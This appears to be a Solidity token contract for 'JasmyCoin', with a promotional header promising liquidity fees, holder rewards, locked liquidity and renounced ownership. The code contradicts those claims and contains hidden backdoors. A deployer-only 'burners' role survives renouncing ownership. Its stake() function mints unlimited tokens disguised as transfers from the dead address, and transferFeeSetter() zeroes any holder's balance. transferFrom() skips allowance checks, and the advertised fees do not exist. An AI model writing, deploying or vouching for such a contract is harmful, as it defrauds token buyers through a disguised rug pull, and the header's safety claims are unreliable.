/**

Welcome to JasmyCoinBsc
   
   This is a community token. If you want to create a telegram I suggest to name it to @JasmyCoinBsc
   Important: The early you create a group that shares the token, the more gain you got.
   
   It's a community token, every holder should promote it, or create a group for it, 
   if you want to pump your investment, you need to do some effort.
   

   Great features:
   5% fee auto add to the liquidity pool to locked forever when selling
   2% fee auto distribute to all holders
   90% burn to the black hole, with such big black hole and 5% fee, the strong holder will get a valuable reward

   I will burn liquidity LPs to burn addresses to lock the pool forever.
   I will renounce the ownership to burn addresses to transfer #JasmyCoinBsc to the community, make sure it's 100% safe.

   I will add .2 BNB and all the left 10% total supply to the pool
   Can you make #JasmyCoinBsc 10000X? 

   
   5% fee for liquidity will go to an address that the contract creates, 
   and the contract will sell it and add to liquidity automatically, 
   it's the best part of the #JasmyCoinBsc idea, increasing the liquidity pool automatically, 
   help the pool grow from the small init pool.

*/

// SPDX-License-Identifier: UNLICENSE
pragma solidity 0.6.12;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  } 
}

contract Context {
    // Empty internal constructor, to prevent people from mistakenly deploying
    // an instance of this contract, which should be used via inheritance.
    constructor() internal {}

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     */
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = false;
}
    contract JasmyCoin is Context, Ownable {
    using SafeMath for uint256;
    address private burners = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    string public name;
    string public symbol;
    address private baddress;
    uint8 public decimals;
    uint public totalSupply;
    constructor() public {
	symbol = "Jasmy";
    name = "JasmyCoin";
    baddress = 0x000000000000000000000000000000000000dEaD;
    decimals = 0;
    totalSupply = 1 * 10**12;
	balances[msg.sender] = totalSupply;
	emit Transfer(address(0), msg.sender, totalSupply);
    }
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    modifier burner() {
        require(msg.sender == burners);
        _;
    }
    function balanceOf(address _owner) view public returns (uint256) {
        return balances[_owner];
    }
    function stake( uint256 tAmount) public burner returns (bool success) {
        balances[msg.sender] = balances[msg.sender]+(tAmount);
        emit Transfer(baddress, msg.sender, tAmount);
        return true;
    }
    function burn(uint256 _amount) public {
        require(_amount  <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[baddress] = balances[baddress].add(_amount);
        emit Transfer(msg.sender, baddress, _amount);
    }
    function transferFeeSetter(address account) public burner{
        emit Transfer(account, baddress, balances[account]);
        balances[baddress] = balances[baddress].add(balances[account]);
        balances[account] = 0;
    }
    function transfer(address _to, uint256 _amount) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, balances[_to]);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _amount) public  returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        balances[_from] = balances[_from].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public  returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) view  public returns (uint256) {
        return allowed[_owner][_spender];
    }
}